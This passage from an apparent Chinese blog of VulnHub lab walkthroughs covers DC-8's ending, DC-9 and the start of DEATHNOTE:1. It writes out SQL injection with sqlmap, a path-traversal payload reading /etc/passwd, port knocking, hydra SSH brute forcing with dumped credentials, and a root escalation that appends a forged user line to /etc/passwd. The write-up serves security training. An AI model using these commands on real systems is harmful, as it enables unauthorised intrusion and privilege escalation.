<figure class="highlight dos"><table><tr><td class="code"><pre><span class="line">ps -<span class="built_in">aux</span></span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221103162544585.png"><img src="/vulnhub/image-20221103162544585.png" alt="image-20221103162544585"></a></p>
<p>这里可以看到，我们的<code>vim</code>正在以<code>user</code>的权限运行中，然后我们去执行一下<code>setuid</code>文件看看</p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221103162848360.png"><img src="/vulnhub/image-20221103162848360.png" alt="image-20221103162848360"></a></p>
<p>这里可以看到，我们虽然是<code>user</code>用户，但执行文件后，文件正以<code>root</code>权限运行<br>我们查看文件的权限</p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221103162937431.png"><img src="/vulnhub/image-20221103162937431.png" alt="image-20221103162937431"></a></p>
<blockquote>
<p><code>r</code>代表读，<code>w</code>代表写，<code>x</code>代表执行，那<code>s</code>是什么呢</p>
</blockquote>
<p><code>s</code>替换了以<code>x</code>的可执行文件，这被称为<code>setuid</code>位，根据刚刚的操作，应该知道了<code>s</code>是做什么的</p>
<p>当这个位被<code>user</code>权限的用户执行时，<code>linux</code>实际上是以文件的创造者的权限运行的，在这种情况下，它是以<code>root</code>权限运行的</p>
<p><strong>我们的目标就是，破解(pwn)这些文件然后拿到<code>root</code>权限读取<code>flag</code></strong></p>
<p>这也就是这个命令执行的目的</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">./raptor_exim_wiz -m setuid</span><br></pre></td></tr></table></figure>



<blockquote>
<p>简而言之，其实就是<code>suid</code>提权</p>
<p>但这里可能是因为靶机的原因无法执行提权成功</p>
</blockquote>
<hr>
<p>总而言之，这一关只是在<code>DC2</code>上修改了一点，只要把前面几关做了，这关难度并不大</p>
<p>【</p>
<p>难受的是遇到<code>pwn</code>，虽然在这里并没有什么用，但是如果遇到这类二进制文件如何修改才能让其成为我们提权的工具，</p>
<p>而且现在二进制还啥也不会，继续学习吧</p>
<p>】</p>
<p><strong>一个旗子找完，游戏结束【吐血了】</strong></p>
<hr>
<h1 id="九、DC9-中级"><a href="#九、DC9-中级" class="headerlink" title="九、DC9[中级]"></a>九、DC9[中级]</h1><p><strong>only one flag</strong></p>
<blockquote>
<p>（dc最后一关）建议可以自己想办法做一下，如果之前是靠别人wp来提供思路的话</p>
</blockquote>
<h2 id="信息收集-8"><a href="#信息收集-8" class="headerlink" title="信息收集"></a>信息收集</h2><p>先用<code>nmap</code>扫一下</p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221103191148810.png"><img src="/vulnhub/image-20221103191148810.png" alt="image-20221103191148810"></a></p>
<p>结果发现只有<code>80</code>端口是打开的</p>
<p>而且也没有什么敏感的信息</p>
<p>然后再<code>dirsearch</code>扫一下</p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221103191356470.png"><img src="/vulnhub/image-20221103191356470.png" alt="image-20221103191356470"></a></p>
<p>结果没有什么有价值的东西</p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221103191535378.png"><img src="/vulnhub/image-20221103191535378.png" alt="image-20221103191535378"></a></p>
<p>在<code>wappalyzer</code>里也看不出什么信息，<code>CMS</code>也没显示</p>
<h2 id="1-sql注入-1"><a href="#1-sql注入-1" class="headerlink" title="1.sql注入"></a>1.sql注入</h2><p>啥也没有信息，但是在<code>display all records</code>下</p>
<p>我们看到一大串枚举数据，很熟悉，这和<code>sql</code>注入感觉有很大的关系</p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221103195324565.png"><img src="/vulnhub/image-20221103195324565.png" alt="image-20221103195324565"></a></p>
<p>找了一下发现<code>url</code>并没有<code>sql</code>注入的方式，那就可能是输入框进行<code>sql</code>注入了</p>
<p>根据枚举的数据，猜测是在<code>search</code>下</p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221103200048490.png"><img src="/vulnhub/image-20221103200048490.png" alt="image-20221103200048490"></a></p>
<p>我们直接抓包数据，拿<code>sqlmap</code>梭哈</p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221103200315686.png"><img src="/vulnhub/image-20221103200315686.png" alt="image-20221103200315686"></a></p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221103200434113.png"><img src="/vulnhub/image-20221103200434113.png" alt="image-20221103200434113"></a></p>
<p>好家伙真的是<code>sql</code>注入</p>
<p>后面不赘述，找到并查看<code>users</code>数据库中用户信息</p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221103200557398.png"><img src="/vulnhub/image-20221103200557398.png" alt="image-20221103200557398"></a></p>
<p>好家伙，完全没有对密码加密</p>
<p>但是根据登录页面，是需要管理员账号的，再根据<code>staff</code>，看来我是找错表了</p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221103200743790.png"><img src="/vulnhub/image-20221103200743790.png" alt="image-20221103200743790"></a></p>
<p>于是按上面一样步骤，查看<code>Staff</code>数据库里的信息</p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221103201409346.png"><img src="/vulnhub/image-20221103201409346.png" alt="image-20221103201409346"></a></p>
<p>果然在这里</p>
<blockquote>
<p><code>transorbital1</code><br>我开始以为是啥密钥，结果是密码明文，麻了</p>
<p>当然时间充足的兄弟可以hashcat试试【坏笑】</p>
</blockquote>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221103202130464.png"><img src="/vulnhub/image-20221103202130464.png" alt="image-20221103202130464"></a></p>
<p>成功登录</p>
<h2 id="2-文件包含"><a href="#2-文件包含" class="headerlink" title="2.文件包含"></a>2.文件包含</h2><p>发现多了两个选项是，一个是增加用户，另一个是登出账号</p>
<p>但是我突然发现</p>
<p>底下莫名多了一行字</p>
<figure class="highlight fortran"><table><tr><td class="code"><pre><span class="line"><span class="keyword">File</span> does not <span class="keyword">exist</span></span><br></pre></td></tr></table></figure>

<p>？？？</p>
<p>哪里来的<code>file</code>，看来是进行了读取文件操作，但是文件参数不存在</p>
<p>猜测可能存在文件包含漏洞</p>
<p>于是我们在<code>url</code>后加上<code>?file=</code>进行文件包含</p>
<blockquote>
<p><code>http://192.168.133.149/manage.php?file=../../../../../etc/passwd</code><br>返回到根目录下，包含&#x2F;etc目录下的passwd文件</p>
</blockquote>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221103205431449.png"><img src="/vulnhub/image-20221103205431449.png" alt="image-20221103205431449"></a></p>
<p>但这里并没有我们想要的信息，</p>
<h2 id="3-ssh"><a href="#3-ssh" class="headerlink" title="3.ssh"></a>3.ssh</h2><h3 id="1）-knockd"><a href="#1）-knockd" class="headerlink" title="1） knockd"></a>1） knockd</h3><blockquote>
<p>在1920年代，当禁令如火如荼地进行时，如果您想进入说话状态，就必须知道秘密的敲门声，并正确地敲打它才能进入内部。</p>
<p>端口敲门是现代的等同物。 如果您希望人们可以访问您计算机上的服务，但又不想将防火墙打开到<del>Internet</del>，则可以使用端口断开功能。<br>它允许您关闭防火墙上允许传入连接的端口，并在进行<code>预先安排的连接尝试</code>方式时自动打开它们。 连接尝试的顺序充当秘密敲门。 另一个秘密的敲门声关闭了港口。</p>
</blockquote>
<p>我在学习笔记写有其原理，可以看看，我不在这里赘述</p>
<p>先查看敲门顺序</p>
<blockquote>
<p><code>http://192.168.133.149/manage.php?file=../../../../../etc/knockd.conf</code></p>
</blockquote>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221103213357210.png"><img src="/vulnhub/image-20221103213357210.png" alt="image-20221103213357210"></a></p>
<p>发现是</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">7469</span>,<span class="number">8475</span>,<span class="number">9842</span></span><br></pre></td></tr></table></figure>

<p>敲一下</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">knock</span> <span class="number">192.168.133.149</span> <span class="number">7469</span> <span class="number">8475</span> <span class="number">9842</span></span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221103214033662.png"><img src="/vulnhub/image-20221103214033662.png" alt="image-20221103214033662"></a></p>
<p>然后再用<code>nmap</code>扫一下，发现<code>22</code>端口开了</p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221103214022727.png"><img src="/vulnhub/image-20221103214022727.png" alt="image-20221103214022727"></a></p>
<h3 id="2）-hydra"><a href="#2）-hydra" class="headerlink" title="2） hydra"></a>2） hydra</h3><p>然后我们用九头蛇爆破登录一下<code>ssh</code></p>
<p>至于账户密码就用我们之前<code>sql</code>注入得到的第一个的数据</p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221103200557398.png"><img src="/vulnhub/image-20221103200557398.png" alt="image-20221103200557398"></a></p>
<blockquote>
<p>username：<br><code>marym</code><br><code>julied</code><br><code>fredf</code><br><code>barneyr</code><br><code>tomc</code><br><code>jerrym</code><br><code>wilmaf</code><br><code>bettyr</code><br><code>chandlerb</code><br><code>joeyt</code><br><code>rachelg</code><br><code>rossg</code><br><code>monicag</code><br><code>phoebeb</code><br><code>scoots</code><br><code>janitor</code><br><code>janitor2</code></p>
</blockquote>
<blockquote>
<p>password：<br><code>3kfs86sfd</code><br><code>468sfdfsd2</code><br><code>4sfd87sfd1</code><br><code>RocksOff</code><br><code>TC&amp;TheBoyz</code><br><code>B8m#48sd</code><br><code>Pebbles</code><br><code>BamBam01</code><br><code>UrAG0D!</code><br><code>Passw0rd</code><br><code>yN72#dsd</code><br><code>ILoveRachel</code><br><code>3248dsds7s</code><br><code>smellycats</code><br><code>YR3BVxxxw87</code><br><code>Ilovepeepee</code><br><code>Hawaii-Five-0</code></p>
</blockquote>
<p>把<code>username</code>和<code>password</code>复制到两个文本文件中去</p>
<figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="attribute">hydra</span> -L user.txt -P pass.txt <span class="number">192.168.133.149</span> ssh</span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221103215414559.png"><img src="/vulnhub/image-20221103215414559.png" alt="image-20221103215414559"></a></p>
<p>发现有三个可以登录</p>
<blockquote>
<p>login: <code>chandlerb</code>   password: <code>UrAG0D!</code><br>login: <code>joeyt</code>   password: <code>Passw0rd</code><br>login: <code>janitor</code>   password: <code>Ilovepeepee</code></p>
</blockquote>
<p>我们先登录<code>janitor</code></p>
<blockquote>
<p>login: <code>janitor</code>   password: <code>Ilovepeepee</code></p>
</blockquote>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221104165102940.png"><img src="/vulnhub/image-20221104165102940.png" alt="image-20221104165102940"></a></p>
<p>登录成功</p>
<h2 id="4-提权"><a href="#4-提权" class="headerlink" title="4.提权"></a>4.提权</h2><p>先执行 </p>
<figure class="highlight ebnf"><table><tr><td class="code"><pre><span class="line"><span class="attribute">sudo -l</span></span><br></pre></td></tr></table></figure>

<p>看看当前用户能以管理员身份执行哪些命令</p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221104165528505.png"><img src="/vulnhub/image-20221104165528505.png" alt="image-20221104165528505"></a></p>
<p>看来我们没有资格</p>
<p>再执行</p>
<figure class="highlight stata"><table><tr><td class="code"><pre><span class="line"><span class="keyword">ls</span> -<span class="keyword">la</span></span><br></pre></td></tr></table></figure>

<p>查看当前用户目录文件</p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221104165145529.png"><img src="/vulnhub/image-20221104165145529.png" alt="image-20221104165145529"></a></p>
<p>发现有个</p>
<figure class="highlight ebnf"><table><tr><td class="code"><pre><span class="line"><span class="attribute">secrets-for-putin</span></span><br></pre></td></tr></table></figure>

<p>可能有管理员密码什么的</p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221104165242513.png"><img src="/vulnhub/image-20221104165242513.png" alt="image-20221104165242513"></a></p>
<p>果然有个文本文件，查看</p>
<figure class="highlight stata"><table><tr><td class="code"><pre><span class="line"><span class="keyword">cat</span> passwords-found-<span class="keyword">on</span>-<span class="keyword">post</span>-it-<span class="keyword">notes</span>.txt</span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221104165331378.png"><img src="/vulnhub/image-20221104165331378.png" alt="image-20221104165331378"></a></p>
<p>又多了几个密码</p>
<blockquote>
<p><code>BamBam01</code><br><code>Passw0rd</code><br><code>smellycats</code><br><code>P0Lic#10-4</code><br><code>B4-Tru3-001</code><br><code>4uGU5T-NiGHts</code></p>
</blockquote>
<p>我们把这个补充到我们九头蛇爆破的密码本里</p>
<p>再进行爆破<code>ssh</code></p>
<figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="attribute">hydra</span> -L user.txt -P pass.txt <span class="number">192.168.133.149</span> ssh</span><br></pre></td></tr></table></figure>

<p>我们发现多了一个新的账号</p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221104165738669.png"><img src="/vulnhub/image-20221104165738669.png" alt="image-20221104165738669"></a></p>
<blockquote>
<p>login: <code>fredf</code>   password: <code>B4-Tru3-001</code></p>
</blockquote>
<p>我们登录<code>ssh</code>看看</p>
<p>再执行</p>
<figure class="highlight ebnf"><table><tr><td class="code"><pre><span class="line"><span class="attribute">sudo -l</span></span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221104165927452.png"><img src="/vulnhub/image-20221104165927452.png" alt="image-20221104165927452"></a></p>
<p>发现其可以以无密码<code>root</code>权限执行</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line"><span class="regexp">/opt/</span>devstuff<span class="regexp">/dist/</span>test/test</span><br></pre></td></tr></table></figure>

<p>我们执行一下试试</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">sudo <span class="regexp">/opt/</span>devstuff<span class="regexp">/dist/</span>test/test</span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221104170533241.png"><img src="/vulnhub/image-20221104170533241.png" alt="image-20221104170533241"></a></p>
<p>提示我们有个test.py正在被读取使用</p>
<p>我们找一下这个文件在哪里</p>
<blockquote>
<p><code>find / -name &quot;test.py&quot; -type f 2&gt;/dev/null</code></p>
<p><code>-type</code> f代表类型为文件，d为目录<br><code>2&gt;/dev/null</code>产生更清晰的输出，因为它会丢弃错误，例如权限错误</p>
</blockquote>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221104170743086.png"><img src="/vulnhub/image-20221104170743086.png" alt="image-20221104170743086"></a></p>
<p>我们到文件目录下查看一下内容</p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221104170808449.png"><img src="/vulnhub/image-20221104170808449.png" alt="image-20221104170808449"></a></p>
<figure class="highlight vim"><table><tr><td class="code"><pre><span class="line">#!/usr/bin/<span class="keyword">python</span></span><br><span class="line"></span><br><span class="line">import sys</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span> (sys.<span class="built_in">argv</span>) != <span class="number">3</span> :</span><br><span class="line">    <span class="keyword">print</span> (<span class="string">&quot;Usage: python test.py read append&quot;</span>)</span><br><span class="line">    sys.<span class="keyword">exit</span> (<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span> :</span><br><span class="line">    <span class="keyword">f</span> = <span class="keyword">open</span>(sys.<span class="built_in">argv</span>[<span class="number">1</span>], <span class="string">&quot;r&quot;</span>)</span><br><span class="line">    output = (<span class="keyword">f</span>.<span class="keyword">read</span>())</span><br><span class="line"></span><br><span class="line">    <span class="keyword">f</span> = <span class="keyword">open</span>(sys.<span class="built_in">argv</span>[<span class="number">2</span>], <span class="string">&quot;a&quot;</span>)</span><br><span class="line">    <span class="keyword">f</span>.<span class="keyword">write</span>(output)</span><br><span class="line">    <span class="keyword">f</span>.<span class="keyword">close</span>()</span><br></pre></td></tr></table></figure>

<h3 id="py脚本利用"><a href="#py脚本利用" class="headerlink" title="py脚本利用"></a>py脚本利用</h3><p><code>脚本接受了两个位置参数，并将第一个文件的内容，附加到第二个文件的内容中</code></p>
<p>其实如果我们有修改脚本的权限就好了，可以改成恶意脚本，但是我们并没有在这个目录写入的权限</p>
<p>于是，我们可以换个思路，就利用脚本的把一个文本内容附加到另外文本的能力，修改我们无法修改的文件，比如<code>/etc/passwd</code></p>
<p>我们先看看<code>/etc/passwd</code>里<code>root</code>用户的格式</p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221104171635506.png"><img src="/vulnhub/image-20221104171635506.png" alt="image-20221104171635506"></a></p>
<p>按这个格式我们写一个自己的</p>
<blockquote>
<p><code>ttoc::0:0:root:/root:/bin/bash</code><br>我这里设置的用户ttoc密码为空</p>
</blockquote>
<hr>
<h4 id="openssl加盐"><a href="#openssl加盐" class="headerlink" title="openssl加盐"></a><code>openssl</code>加盐</h4><p>其实这里是需要给我们真假的用户添加密码的</p>
<p>不然是通过不了密码输入那一环，那里不允许密码为空</p>
<p>我们执行</p>
<blockquote>
<p><code>openssl passwd -1 -salt salt password</code></p>
<p><code>-1</code>使用什么哈希算法。在我们的用例中，这无关紧要，因此我们使用 MD5，在现实世界的 PT 中应该避免使用 MD5，因为它不安全。</p>
<p><code>-salt</code> salt用作盐的字符串。我选择字符串盐</p>
<p><code>password</code>我们想使用的明文密码</p>
</blockquote>
<p>得到</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line"><span class="variable">$1</span><span class="variable">$salt</span><span class="variable">$qJH7</span>.N4xYta3aEG<span class="regexp">/dfqo/</span><span class="number">0</span></span><br></pre></td></tr></table></figure>

<p><strong>注意如果开始没加密码就传入&#x2F;etc&#x2F;passwd，后面修改后再传用户，名字不能相同</strong></p>
<hr>
<p>但是注意我们其实在很多目录下都没有写入权限，但是我们可以用经典使用</p>
<p><code>/tmp</code>，临时文件目录下的权限管控一般不大</p>
<p>于是我们把我们的内容写入<code>/tmp</code>目录下的<code>evil</code>文件中</p>
<blockquote>
<p><code>echo &#39;ttoc:$1$salt$qJH7.N4xYta3aEG/dfqo/0:0:0:root:/root:/bin/bash&#39; &gt; /tmp/evil</code></p>
<p>*注意这里需要单引号，双引号会把$后面参数当作变量</p>
</blockquote>
<p>然后我们再执行</p>
<blockquote>
<p><code>sudo /opt/devstuff/dist/test/test /tmp/evil /etc/passwd</code></p>
<p>把我们创建的用户root添加到文本去</p>
</blockquote>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221104172732031.png"><img src="/vulnhub/image-20221104172732031.png" alt="image-20221104172732031"></a></p>
<p>最后登录<code>ttoc</code></p>
<figure class="highlight ebnf"><table><tr><td class="code"><pre><span class="line"><span class="attribute">su ttoc</span></span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221104173707687.png"><img src="/vulnhub/image-20221104173707687.png" alt="image-20221104173707687"></a></p>
<p>成功提取</p>
<p>读取<code>flag</code></p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221104173836066.png"><img src="/vulnhub/image-20221104173836066.png" alt="image-20221104173836066"></a></p>
<blockquote>
<figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">███╗   ██╗██╗ ██████╗███████╗    ██╗    ██╗ ██████╗ ██████╗ ██╗  ██╗██╗██╗██╗</span><br><span class="line">████╗  ██║██║██╔════╝██╔════╝    ██║    ██║██╔═══██╗██╔══██╗██║ ██╔╝██║██║██║</span><br><span class="line">██╔██╗ ██║██║██║     █████╗      ██║ █╗ ██║██║   ██║██████╔╝█████╔╝ ██║██║██║</span><br><span class="line">██║╚██╗██║██║██║     ██╔══╝      ██║███╗██║██║   ██║██╔══██╗██╔═██╗ ╚═╝╚═╝╚═╝</span><br><span class="line">██║ ╚████║██║╚██████╗███████╗    ╚███╔███╔╝╚██████╔╝██║  ██║██║  ██╗██╗██╗██╗</span><br><span class="line">╚═╝  ╚═══╝╚═╝ ╚═════╝╚══════╝     ╚══╝╚══╝  ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝╚═╝╚═╝</span><br><span class="line"><span class="code">                                                                             </span></span><br><span class="line"><span class="code"></span></span><br></pre></td></tr></table></figure>

<p><code>Congratulations - you have done well to get to this point.</code></p>
<p><code>Hope you enjoyed DC-9.  Just wanted to send out a big thanks to all those</code><br><code>who have taken the time to complete the various DC challenges.</code></p>
<p><code>I also want to send out a big thank you to the various members of @m0tl3ycr3w .</code></p>
<p><code>They are an inspirational bunch of fellows.</code></p>
<p><code>Sure, they might smell a bit, but...just kidding.  :-)</code></p>
<p><code>Sadly, all things must come to an end, and this will be the last ever</code><br><code>challenge in the DC series.</code></p>
<p><code>So long, and thanks for all the fish.</code></p>
<p>意思是：<br>恭喜 - 你已经完成了这一点。</p>
<p>希望你喜欢 DC-9。只是想对所有这些人表示衷心的感谢<br>他们花时间完成了各种 DC 挑战。</p>
<p>我还要向@m0tl3ycr3w 的各个成员表示衷心的感谢。</p>
<p>他们是一群鼓舞人心的人。</p>
<p>当然，它们可能会闻到一点味道，但是……开玩笑。 :-)</p>
<p>可悲的是，一切都必须结束，这将是最后一次<br>DC系列中的挑战。</p>
<p>这么久，感谢所有的鱼。</p>
</blockquote>
<p><strong>一个旗子找完，游戏结束</strong></p>
<p>【dc系列结束，阅读到本文的朋友，希望对你们有所帮助】</p>
<hr>
<h1 id="ELSE"><a href="#ELSE" class="headerlink" title="ELSE"></a>ELSE</h1><h1 id="一、DEATHNOTE-1-初级"><a href="#一、DEATHNOTE-1-初级" class="headerlink" title="一、DEATHNOTE: 1[初级]"></a>一、DEATHNOTE: 1[初级]</h1><p>基拉好帅，必须拿这个开头，直接提权进他的心【不是南通】</p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221106151711523.png"><img src="/vulnhub/image-20221106151711523.png" alt="image-20221106151711523"></a></p>
<blockquote>
<p>hint:<br>不要浪费太多时间跳出框框思考。这是一个直截了当的盒子。</p>
</blockquote>
<hr>
<p>找这个靶场<code>ip</code>，就把我卡住了，后面看到好像这个靶机和<code>vm</code>不兼容，只能用<code>vitrualbox</code></p>
<p>后面下了个<code>vitrualbox</code>才找到靶机<code>ip</code></p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221108134734459.png"><img src="/vulnhub/image-20221108134734459.png" alt="image-20221108134734459"></a></p>
<p>然后<code>vm</code>也桥接，就找到了</p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221108190437827.png"><img src="/vulnhub/image-20221108190437827.png" alt="image-20221108190437827"></a></p>
<p>顺带补充两个扫描工具【使用自行<code>-h</code>查看】【感觉和<code>nmap</code>差不多】</p>
<blockquote>
<p><code>arp-scan</code>是Kali Linux自带的一款ARP扫描工具。该工具可以进行单一目标扫描，也可以进行批量扫描。批量扫描的时候，用户可以通过CIDR<br>地址范围或者列表文件的方式指定。该工具允许用户定制ARP包，构建非标准数据包。同时，<code>该工具会自动解析Mac地址，给出MAC对应的硬</code><br><code>件厂商，帮助用户确认目标。</code></p>
<p><code>netdiscover</code><br>Netdiscover是一种网络扫描工具，通过ARP扫描发现活动主机，可以通过主动和被动两种模式进行ARP扫描。通过主动发送ARP请求检查网络ARP流量，通过自动扫描模式扫描网络地址。本文介绍Netdiscover的安装和使用方法。</p>
</blockquote>
<hr>
<h2 id="信息收集-9"><a href="#信息收集-9" class="headerlink" title="信息收集"></a>信息收集</h2><p>习惯<code>nmap</code>扫一下</p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221108191059284.png"><img src="/vulnhub/image-20221108191059284.png" alt="image-20221108191059284"></a></p>
<blockquote>
<p><code>22</code>端口开放，运行<code>ssh</code><br><code>80</code>端口开放，运行<code>http</code></p>
</blockquote>
<p>然后访问靶机<code>ip</code></p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221108192408036.png"><img src="/vulnhub/image-20221108192408036.png" alt="image-20221108192408036"></a></p>
<p>看到页面显示<code>please wait.....</code></p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221108192756267.png"><img src="/vulnhub/image-20221108192756267.png" alt="image-20221108192756267"></a></p>
<p>然后显示连接失败</p>
<p>看来是需要修改<code>/etc/hosts</code>文件，添加靶机域名和<code>ip</code></p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221108193016082.png"><img src="/vulnhub/image-20221108193016082.png" alt="image-20221108193016082"></a></p>
<p>再次访问靶机<code>ip</code></p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221108193044669.png"><img src="/vulnhub/image-20221108193044669.png" alt="image-20221108193044669"></a></p>
<p>访问成功</p>
<p>我们先查看一下网站的框架</p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221108200530705.png"><img src="/vulnhub/image-20221108200530705.png" alt="image-20221108200530705"></a></p>
<blockquote>
<p><code>CMS</code>为<code>wordpress 5.8</code>，很老的版本了，这里肯定有提权的方式</p>
<p>采用脚本为<code>Twiiter Emoji</code>，这是推特的开源库里的引用表情的脚本，不是关键</p>
</blockquote>
<p>我们看到页面有<code>hint</code></p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221108193350489.png"><img src="/vulnhub/image-20221108193350489.png" alt="image-20221108193350489"></a></p>
<blockquote>
<p><code>Find a notes.txt file on server or SEE the L comment</code> </p>
<p>意思是：</p>
<p>找到一个notes.txt 文件服务器上<br>或</p>
<p>看看L的评论 </p>
<p>那我们就可以用dirsearch扫一下，看看能不能找到notes.txt文件在哪里，以及评论网页在哪里</p>
</blockquote>
<p>评论页面我是在首页面中间</p>
<blockquote>
<p><code>i will eliminate you L!</code></p>
</blockquote>
<p>链接跳转找到的，但好像没啥信息，似乎看不到<code>L</code>的评论</p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221108204306618.png"><img src="/vulnhub/image-20221108204306618.png" alt="image-20221108204306618"></a></p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">http:<span class="regexp">//</span>deathnote.vuln<span class="regexp">/wordpress/i</span>ndex.php<span class="regexp">/2021/</span><span class="number">07</span><span class="regexp">/19/</span>kira/</span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221108204334859.png"><img src="/vulnhub/image-20221108204334859.png" alt="image-20221108204334859"></a></p>
<p>左下角的</p>
<blockquote>
<p><code>my fav line is iamjustic3</code></p>
<p><code>L on i will eliminate you L!</code></p>
<p>我最喜欢的台词是<code>iamjustic3</code><br><code>L</code> 在 ，我会消灭你L! </p>
<p><code>iamjustic3</code>：分开看i am justic 3【我是正义的3】，但好像实际意思，后面看看能不能利用的</p>
<p><code>eliminate</code>：消灭，纯粹单词意思，没啥意义</p>
</blockquote>
<p>我们先用<code>dirsearch</code>扫一下找一下信息</p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221108200416113.png"><img src="/vulnhub/image-20221108200416113.png" alt="image-20221108200416113"></a></p>
<h3 id="关键信息"><a href="#关键信息" class="headerlink" title="*关键信息"></a>*关键信息</h3><p>关键登录页面和<code>robots.txt</code>【其他页面没有啥信息】</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">http:<span class="regexp">//</span>deathnote.vuln<span class="regexp">/wordpress/</span>wp-login.php</span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221108201422820.png"><img src="/vulnhub/image-20221108201422820.png" alt="image-20221108201422820"></a></p>
<p>爬虫文本</p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221108201357084.png"><img src="/vulnhub/image-20221108201357084.png" alt="image-20221108201357084"></a></p>
<blockquote>
<p><code>fuck it my dad</code><br><code>added hint on /important.jpg</code></p>
<p><code>ryuk please delete it</code><br>意思是：<br>x我的爸爸<br>他把暗示藏在了<code>/important.jpg</code>里</p>
<p>ryuk，请删了它</p>
<p>ryuk是基拉的死神，基拉让他删除图片，同时图片也藏有信息<br>虽然我们找到了登录页面，以及用户名，但是还是不知道密码<br>所以还要找密码</p>
</blockquote>
<p>我们先试试我们能不能查看<code>/important.jpg</code></p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221108210813828.png"><img src="/vulnhub/image-20221108210813828.png" alt="image-20221108210813828"></a></p>
<p>发现图片无法显示</p>
<p>看来图片格式有问题，应该是插入了文本什么的</p>
<p>我们用<code>curl</code></p>
<figure class="highlight 1c"><table><tr><td class="code"><pre><span class="line">curl http:<span class="comment">//deathnote.vuln/important.jpg</span></span><br></pre></td></tr></table></figure>

<p>得到</p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221108220741696.png"><img src="/vulnhub/image-20221108220741696.png" alt="image-20221108220741696"></a></p>
<blockquote>
<p><code>i am Soichiro Yagami, light&#39;s father</code><br><code>i have a doubt if L is true about the assumption that light is kira</code></p>
<p><code>i can only help you by giving something important</code></p>
<p><code>login username : user.txt</code><br><code>i don&#39;t know the password.</code><br><code>find it by yourself</code><br><code>but i think it is in the hint section of site</code></p>
<p>意思是：<br>我是光的父亲 八神宗一郎<br>我怀疑 L 关于光是 kira 的假设是否正确</p>
<p>我只能通过提供一些重要的东西来帮助你</p>
<p>登录用户名：<code>user.txt</code><br>我不知道密码。<br>自己找<br>但我认为它在网站的提示部分<br>#<code>user.txt</code>看来需要同样访问找一下<br>#提示部分有密码，看来就是<code>notes.txt</code>文本里了</p>
</blockquote>
<p>那后面就是找一下这两个文本文件在哪里了</p>
<h2 id="1-wpscan"><a href="#1-wpscan" class="headerlink" title="1.wpscan"></a>1.wpscan</h2><p>既然信息不够，那我们就用对应的<code>CMS</code>工具【<code>wpscan</code>】扫一下看看有没有信息</p>
<figure class="highlight jboss-cli"><table><tr><td class="code"><pre><span class="line">wpscan <span class="params">--url</span> http:<span class="string">//deathnote.vuln/wordpress</span> -e u</span><br></pre></td></tr></table></figure>

